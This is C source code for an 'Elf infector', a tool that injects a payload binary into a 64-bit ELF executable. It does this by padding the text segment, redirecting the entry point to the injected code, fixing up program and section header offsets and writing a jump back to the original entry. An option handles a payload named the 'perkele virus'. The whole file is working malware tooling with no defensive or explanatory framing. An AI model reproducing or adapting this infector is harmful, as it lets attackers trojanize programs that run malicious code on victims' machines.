#include <stdio.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <zconf.h>
#include <string.h>
#include <errno.h>
#include "payload.h"


static const char USAGE[] =
        "Elf infector\n"
        "Usage:\n"
        "./infector [-h|-p] <infected_filename> <payload_filename> <output_filename>\n"
        "Options:\n"
        "-h --help     Show this screen.\n"
        "-p     Payload path is a path to perkele virus.\n";

int main(int argc, char** argv){
    int is_perkele = 0;
    char * in_file;
    char * payload;
    char * out_file;
    if(argc < 2){
        printf("Not enough arguments");
        return -1;
    } else if(!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")){
        printf("%s", USAGE);
        return 0;
    } else if(argc == 5 && !strcmp(argv[1], "-p")){
        is_perkele = 1;
        in_file = argv[2];
        payload = argv[3];
        out_file = argv[4];
    } else if(argc == 4){
        in_file = argv[1];
        payload = argv[2];
        out_file = argv[3];
    } else{
        printf("Invalid arguments");
        return -1;
    }

    int virus_fd;
    uint8_t* memory;
    size_t virus_size, virus_file_size;
    Elf64_Addr text_off_t, jmp_off_t;
    get_virus_payload(payload, &virus_fd, &memory, &virus_size, &text_off_t, &virus_file_size);
    uint8_t *text_section = memory + text_off_t;
    if(is_perkele){
        get_jump_offset(memory, virus_size, text_off_t, &jmp_off_t);
    }
    unsigned char * parasite =  (unsigned  char*)"\xE9\xF2\xFC\xFF\xF1";
    size_t  jump_length = 5;
    size_t length_without_jump = virus_size;
    struct stat sb;
    size_t psize = getpagesize();
    int jmp_len;
    if(is_perkele){
        jmp_len = length_without_jump;
    } else{
        jmp_len = length_without_jump + jump_length;
    }




    int fd = open(in_file, O_RDWR);
    if(fd < 0){
        return -1;
    }
    if(fstat(fd, &sb) < 0){
        close(fd);
        return  -1;
    }

    uint8_t *mem = mmap(NULL, sb.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem ==  MAP_FAILED){
        return -1;
    }
    Elf64_Ehdr* ehdr = (Elf64_Ehdr *) mem;
    Elf64_Phdr* phdr = (Elf64_Phdr *) &mem[ehdr->e_phoff];
    Elf64_Shdr* shdr = (Elf64_Shdr *) &mem[ehdr->e_shoff];
    Elf32_Addr parasite_insertion_address, start_of_text, end_of_text, older_entry;
    older_entry = ehdr->e_entry;
    printf("%x\n", ehdr->e_entry);
    ehdr->e_shoff += psize;

    for(int  i = 0; i < ehdr->e_phnum; i++){
        if(phdr[i].p_type == PT_LOAD){
            ehdr->e_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
            parasite_insertion_address = phdr[i].p_vaddr + phdr[i].p_filesz;
            start_of_text  = phdr[i].p_offset;
            end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
            phdr[i].p_filesz += jmp_len;
            phdr[i].p_memsz += jmp_len;
            for(int j = i+1; j < ehdr->e_phnum; j++){
                if(phdr[j].p_offset > parasite_insertion_address - phdr[i].p_vaddr + phdr[i].p_offset){
                    phdr[j].p_offset += psize;
                }
            }
            break;
        }
    }

    for(int i = 0; i < ehdr->e_shnum; i++){
        if(shdr[i].sh_addr > start_of_text && shdr[i].sh_addr < end_of_text && shdr[i + 1].sh_addr > end_of_text){
            shdr[i].sh_size += jmp_len;
        } else if(shdr[i].sh_addr > parasite_insertion_address){
            shdr[i].sh_offset += psize;
        }
    }
    int out_fd = open(out_file,O_CREAT | O_WRONLY | O_TRUNC, 0777);
    if(out_fd < 0){
        printf("%d", errno);
        return -1;
    }
    if(write(out_fd, mem, (size_t) end_of_text) < 0){
        printf("%d", errno);
        return -1;
    }
    Elf64_Addr jmp;
    static unsigned char address[4];
    if(is_perkele){
       jmp = older_entry - (ehdr->e_entry + jmp_off_t);
        *(int*)&address[0] = jmp;

        if(write(out_fd, text_section, jmp_off_t - 5) < 0){
            return -1;
        }
    } else{
        jmp = older_entry - (ehdr->e_entry + virus_size + 5);
        *(int*)&address[0] = jmp;
        if(write(out_fd, text_section, virus_size) < 0){
            return -1;
        }
    }




    if(write(out_fd, parasite, 1) < 0){
        return -1;
    }
    if(write(out_fd, address, 4) < 0){
        return -1;
    }
    if(is_perkele){
        if(write(out_fd, text_section + jmp_off_t, virus_size - jmp_off_t) < 0){
            return -1;
        }
    }



    if(lseek(out_fd, psize - jmp_len, SEEK_CUR) < 0){
        return -1;
    }
    if(write(out_fd, mem + end_of_text, sb.st_size - end_of_text) < 0){
        return -1;
    }
    printf("%x", ehdr->e_entry);


    munmap(mem, sb.st_size);
    munmap(memory, virus_file_size);
    close(out_fd);
    close(fd);
    close(virus_fd);
    return 0;
}